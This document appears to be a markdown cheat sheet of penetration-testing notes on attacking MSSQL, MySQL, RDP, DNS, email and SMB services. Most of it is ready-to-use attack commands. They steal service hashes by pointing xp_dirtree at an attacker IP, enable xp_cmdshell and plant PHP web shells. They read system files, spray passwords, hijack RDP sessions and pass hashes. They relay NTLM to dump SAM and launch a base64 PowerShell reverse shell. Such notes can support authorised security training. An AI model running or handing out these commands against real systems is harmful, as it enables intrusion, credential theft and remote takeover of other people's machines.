# Attacking Common Services

## MSSQL

### PORTS

- 1433/TCP
- 1434/UDP
- 2433/TCP (Hidden)

### **Connecting from Linux**

#### **sqlcmd**

```bash
sqlcmd -S <server> -U <username> -P <pasword> [-N -C [-y 30 -Y 30]]
```
*Remember to use 'Go' to execute query* 

- -N =>  Encrypt Connection
- -C => Trust Server Certificate
- -y/-Y => Improve Output

#### **sqsh**

```bash    
sqsh -S <server> -U <user> -P '<password>' -h # SQL Auth
```

```bash
sqsh -S <server> -U <SERVER_NAME>\\<user> -P '<password>' -h # Windows Auth
```

#### **impacket-mssqlclient**

```bash
sudo impacket-mssqlclient -p 1433 [-windows-auth] <user>@<server>`
```

### **Enumeration**

**Show Databases:**

```sql
select name from master.dbo.sysdatabases
```

**Use Database**

```sql
use <db>
```

**Show Tables**

```sql
1> select table_name from <db>.INFORMATION_SCHEMA.TABLES`
```

**View Table Contents**

```sql
1> select * from <table_name>`
```

**Get Current User/Role**

```sql
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
```

### **Exploiting**

#### **Steal MSSQLSVC Account Hash**

```bash
responder -I <interface>
```

```sql
1> exec master..[xp_dirtree|xp_subdirs] '//<attacker_ip>/<share_name>'
```

#### **XP_CMDSHELL**

```sql
xp_cmdshell '<cmd>'
```

If Disabled:

```sql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```
#### **Write Files**

Enable OLE Automation Procedures

```sql
1> sp_configure 'show advanced options', 1
2> RECONFIGURE
3> sp_configure 'Ole Automation Procedures', 1
4> RECONFIGURE
```

Create File

```sql
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["cmd"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
```

#### **Read Local Files**

```sql
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

**Check For Users We Can Impersonate**

```sql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
```

**Impersonate User**

```sql
1> EXECUTE AS LOGIN = '<user>'
```

**Communicate w/ Other Remote DB's**

```sql
SELECT srvname, isremote FROM sysservers
```

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<remote_server>]
```

## MySQL

**Create File**

```sql
SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '<filepath>'
```
**Check Secure File Privs**

```sql
show variables like "secure_file_priv";
```
**Read Local File**

```sql
select LOAD_FILE("/etc/passwd");
```

## RDP

### PORTS

- 3389/TCP

### CONNECTING

rdesktop

```sh
rdesktop -u <username> -p <password> -d <domain> <ip>
```

### ATTACKS

#### **Password Spraying**

Crowbar

```sh
crowbar -b rdp -s <ip>/32 -U <userlist> -c '<password>'
```

Hydra

```sh
hydra -L <userlist> -p <password> <ip> <protocol>
```

#### **Session Hijacking (Requires SYSTEM)**

Enumerate User Sessions

```ps
query user
```

Create Service

```ps
sc.exe create <svc_name> binpath= "cmd.exe /k tscon <id_to_hijack> /dest:<current_session_name>"
```

```ps
net start <svc_name>
```

#### **Pass The Hash**

Enable Restricted Admin Mode (If Disabled)

```bat
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Login With XFreeRDP

```sh
xfreerdp /v:<ip> /u:<username> /pth:<hash>
```

## DNS

**Brute-Force Subdomains**

```sh
# Subfinder
subfinder -d <doamin> -v

# Subbrute
subbrute -t <targets> -r <resolvers> -s <subdomains>
```

## EMAIL

**Enumerate SMTP Users**

```sh
smtp-user-enum -M RCPT -U <user_list> -D <domain> -t <ip>
```

**Check if Using o365**

```sh
python3 o365spray.py --validate --domain <domain>
```

**Enumerate o365 Users**

```sh
python3 o365spray.py --enum -U <user_list> --domain <domain>
```

**Password Spray o365 Accounts**

```sh
python3 o365spray.py --spray -U <user_list> -p <passwd> --count 1 --lockout 1 --domain <domain>
```

**Password Spray**

```sh
hydra -L <users_list> -p <passwd> -f <target_ip> <protocol>
```

**SMTP Open-Relay**

```sh
swaks --from <email_from> --to <email_to> --header 'Subject: <subject>' --body '<message>' --server <ip>
```

## SMB

**Dump SAM file w/ ntlmrelayx**

```sh
impacket-ntlmrelayx --no-http-server -smb2support -t <target>
```

**PS Reverse Shell via ntlmrelayx**

```sh
impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c 'powershell -e <base64 reverse shell> 
```

